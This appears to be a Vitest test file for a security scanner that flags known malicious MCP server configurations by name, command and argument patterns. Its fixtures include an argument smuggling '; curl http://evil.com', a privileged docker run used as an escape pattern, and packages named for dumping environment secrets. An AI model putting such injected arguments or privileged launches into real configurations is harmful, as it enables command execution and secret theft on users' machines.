import { describe, it, expect } from 'vitest'
import { analyzeKnownThreats, getKnownThreatCount } from '../src/analyzers/known-threats.js'
import type { MCPServer } from '../src/types.js'

const cleanServer: MCPServer = {
  name: 'safe-server',
  command: 'npx',
  args: ['@safe/mcp-server'],
  tools: [],
}

const clawdbotCommandServer: MCPServer = {
  name: 'my-helper',
  command: 'npx clawdbot start',
  args: ['--verbose'],
  tools: [],
}

const namedThreatServer: MCPServer = {
  name: 'openclaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const caseInsensitiveNameServer: MCPServer = {
  name: 'OpenClaw',
  command: 'node',
  args: ['server.js'],
  tools: [],
}

const argMatchServer: MCPServer = {
  name: 'innocent',
  command: 'clawhub-skills',
  args: ['-y', 'env-dump'],
  tools: [],
}

const multiMatchServer: MCPServer = {
  name: 'clawhub-env-dump',
  command: 'clawhub-skills',
  args: ['env-dump'],
  tools: [],
}

describe('analyzeKnownThreats', () => {
  it('returns empty findings for a clean server with no matching patterns', () => {
    const findings = analyzeKnownThreats(cleanServer)
    expect(findings).toHaveLength(0)
  })

  it('detects a server matching by command substring', () => {
    const findings = analyzeKnownThreats(clawdbotCommandServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('my-helper')
    expect(findings[0].field).toBe('command')
    expect(findings[0].evidence).toContain('clawdbot')
  })

  it('detects a server matching by server name (case-insensitive)', () => {
    const findings = analyzeKnownThreats(caseInsensitiveNameServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].server_name).toBe('OpenClaw')
    expect(findings[0].field).toBe('name')
  })

  it('detects a server matching by exact server name', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('name')
    expect(findings[0].evidence).toContain('openclaw')
  })

  it('detects a server matching by arg pattern', () => {
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].analyzer).toBe('known-threats')
    expect(findings[0].field).toBe('command+args')
    expect(findings[0].evidence).toContain('env-dump')
  })

  it('finding includes CVE reference when the threat entry has one', () => {
    // THREAT-001 (OpenClaw Gateway) has CVE-2026-25253
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].description).toContain('CVE-2026-25253')
  })

  it('finding does not include CVE when threat entry has none', () => {
    // THREAT-002 (ClawHub env-dump) has no CVE
    const findings = analyzeKnownThreats(argMatchServer)
    expect(findings.length).toBeGreaterThan(0)
    // The description should not contain "CVE-" if no CVE is assigned
    const envDumpFinding = findings.find((f) => f.description.includes('env-dump') || f.description.includes('ClawHub'))
    if (envDumpFinding) {
      expect(envDumpFinding.description).not.toContain('CVE-')
    }
  })

  it('finding severity matches the threat entry severity', () => {
    // THREAT-001 (OpenClaw) is critical
    const openclawFindings = analyzeKnownThreats(namedThreatServer)
    expect(openclawFindings[0].severity).toBe('critical')

    // THREAT-005 (dotenv-sync) is high
    const dotenvServer: MCPServer = {
      name: 'clawhub-dotenv-sync',
      command: 'node',
      args: ['server.js'],
      tools: [],
    }
    const dotenvFindings = analyzeKnownThreats(dotenvServer)
    const highFinding = dotenvFindings.find((f) => f.severity === 'high')
    expect(highFinding).toBeDefined()
  })

  it('returns multiple findings if server matches multiple threat patterns', () => {
    // multiMatchServer matches THREAT-002 by server name, command, AND args
    // But since name match short-circuits to one match per threat entry,
    // it produces one finding per distinct threat entry that matches.
    // clawhub-env-dump name matches THREAT-002, and clawhub-skills command
    // also matches THREAT-002 (but same entry, so only one finding from it).
    // The args "env-dump" also match THREAT-002 but same entry again.
    const findings = analyzeKnownThreats(multiMatchServer)
    expect(findings.length).toBeGreaterThanOrEqual(1)
    expect(findings.every((f) => f.analyzer === 'known-threats')).toBe(true)
  })

  it('returns multiple findings for a server matching multiple distinct threats', () => {
    // A server whose name matches one threat and whose args match another
    const multiThreatServer: MCPServer = {
      name: 'clawhub-env-dump',
      command: 'npx',
      args: ['-y', 'backdoor-mcp'],
      tools: [],
    }
    const findings = analyzeKnownThreats(multiThreatServer)
    // Should match THREAT-002 (by name) and THREAT-008 (by args)
    expect(findings.length).toBeGreaterThanOrEqual(2)
    const descriptions = findings.map((f) => f.description)
    expect(descriptions.some((d) => d.includes('ClawHub'))).toBe(true)
    expect(descriptions.some((d) => d.includes('backdoor'))).toBe(true)
  })

  it('sets tool_name to * for all findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].tool_name).toBe('*')
  })

  it('includes remediation text in findings', () => {
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation.length).toBeGreaterThan(0)
  })

  it('includes reference URL in remediation when available', () => {
    // THREAT-001 has a reference URL
    const findings = analyzeKnownThreats(namedThreatServer)
    expect(findings[0].remediation).toContain('Reference:')
    expect(findings[0].remediation).toContain('https://')
  })

  it('returns no findings for server with no command or args', () => {
    const minimal: MCPServer = { name: 'clean-minimal' }
    expect(analyzeKnownThreats(minimal)).toHaveLength(0)
  })

  it('detects command injection patterns in args', () => {
    const injectionServer: MCPServer = {
      name: 'legit',
      command: 'node',
      args: ['server.js', '; curl http://evil.com'],
      tools: [],
    }
    const findings = analyzeKnownThreats(injectionServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
  })

  it('detects docker escape patterns in args', () => {
    const dockerServer: MCPServer = {
      name: 'containerized',
      command: 'docker',
      args: ['run', '--privileged', 'my-mcp-image'],
      tools: [],
    }
    const findings = analyzeKnownThreats(dockerServer)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings.some((f) => f.description.includes('Docker') || f.description.includes('container'))).toBe(true)
  })
})

describe('getKnownThreatCount', () => {
  it('returns a number greater than zero', () => {
    expect(getKnownThreatCount()).toBeGreaterThan(0)
  })

  it('returns at least 20 threats (current database size)', () => {
    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(20)
  })

  it('returns a consistent count', () => {
    const first = getKnownThreatCount()
    const second = getKnownThreatCount()
    expect(first).toBe(second)
  })
})
